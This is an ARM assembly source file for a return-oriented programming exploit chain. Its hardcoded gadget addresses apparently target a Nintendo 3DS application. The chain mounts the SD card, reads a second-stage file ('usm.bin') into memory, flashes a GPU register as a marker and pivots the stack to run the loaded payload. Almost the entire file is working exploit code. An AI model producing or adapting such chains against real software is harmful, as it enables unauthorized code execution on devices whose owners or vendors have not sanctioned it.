//#include "rop_gadgets.h"
.arm
	.text

#define DUMPSTART 	0x00100000
#define DUMPSIZE	0x00659000 

#define ROP_POPPC 0x001000c4
#define POP_R1PC 0x001c5614
#define POP_R3PC 0x00110ce0
#define POP_R2R6PC 0x0019d820
#define POP_R4LR_BXR1 0x0014f844
#define POP_R4R8LR_BXR2 0x001464c4
#define POP_R4R5R6PC 0x00100120
#define POP_R4FPPC 0x0010dbc0
#define POP_R4R8PC 0x0010dd48
#define POP_R0R2R5PC 0x0010de68+1   // pop {r0, r1, r2, r5, pc} - thumb
#define POP_R0R4PC 0x001442a8+1     // pop {r0, r1, r2, r3, r4, pc} - thumb
#define POP_R0R1 0x001143fc+1       // pop {r0, r1, pc} -thumb

#define ROP_STR_R1TOR0 0x00112f3c
#define ROP_STR_R0TOR1 0x00196fb8
#define ROP_LDR_R0FROMR0 0x001878d8
#define ROP_ADDR0_TO_R1 0x001928e4

#define FS_MountSdmc 0x1A3C04+4
#define IFile_Write 0x001bd984+4
#define IFile_Read 0x001bd8e8+4
#define svcSleepThread 0x001955c0

#define ROP_POPR3_ADDSPR3_POPPC 0x001000bc+4 
#define POP_R0PC 0x00100874
#define ROP_LDRR1R1_STRR1R0 0x001b746c

#define IFile_Open 0x001bdb84+4
#define	GSP_HANDLE_PTR 0x00260e3c
#define GSPGPU_WriteHWRegs 0x002289F4
#define HWREGS_ADDR 0x00202A04 
#define MAGENTA 0x01ff00ff
#define RED 0x010000FF
//#define magenta_addr 0x0026f390
#define ROPADDR 0x600000
#define ROPSIZE 0x20000
#define GetInfoBlk8 0x1fb184
#define CRASH 0x98989898

	.global	_start
@---------------------------------------------------------------------------------
_start:

	.word ROP_POPPC
	.word POP_R0PC
		.word SdMount
	.word POP_R1PC
		.word 0x9
	.word FS_MountSdmc
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
	.word POP_R0R2R5PC		@ ldmfd sp!, {r0,pc}
		.word FILE		@ (r0) - _this
		.word FileName		@ (r1) - path
		.word 0x00000001	@ (r2) - openflags
		.word 0x0   		@ (r5) - mandatory NULL here or whole slot is wiped (offsets 0x174,0x218,0x2bc)
	.word IFile_Open		@ IFile_Open(): r0=_this r1=UTF16 path r2=openflags, ends with ldmfd sp!, {r4-r8,pc}
		.word 0xdeadbeef	@ (r4)
		.word 0xdeadbeef	@ (r5)
		.word 0xdeadbeef	@ (r6)
		.word 0xdeadbeef	@ (r7)
	.word POP_R0R4PC		@ ldmfd sp!, {r0,pc}
		.word FILE		@ (r0) - _this
		.word FILE + 32		@ (r1) - &writtenbytes
		.word ROPADDR		@ (r2) - src
		.word ROPSIZE		@ (r3) - size
		.word 0xdeadbeef	@ (r4)
	.word IFile_Read		@ IFile_Read(_this, &writtenbytes, src, size) ends with ldmfd sp!, {r4-r11,pc}
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
	.word POP_R0R4PC
		.word GSP_HANDLE_PTR
		.word HWREGS_ADDR  
		.word red_addr
		.word 4
		.word 0xdeadbeef
	.word GSPGPU_WriteHWRegs
		.word 0xdeadbeef
		.word 0xdeadbeef
		.word 0xdeadbeef
	.word POP_R3PC
		.word ROPADDR - _start - 8
	.word ROP_POPR3_ADDSPR3_POPPC
current_SP:

SdMount:
	.ascii "YS:\0\0\0\0\0"
	
.word 0,0,0,0,0,0,0,0,0,0

red_addr:
	.word RED
	
FileName:
	.string16 "YS:/usm.bin\0"	
.balign 4
FILE: 
@.fill	64, 1, 0






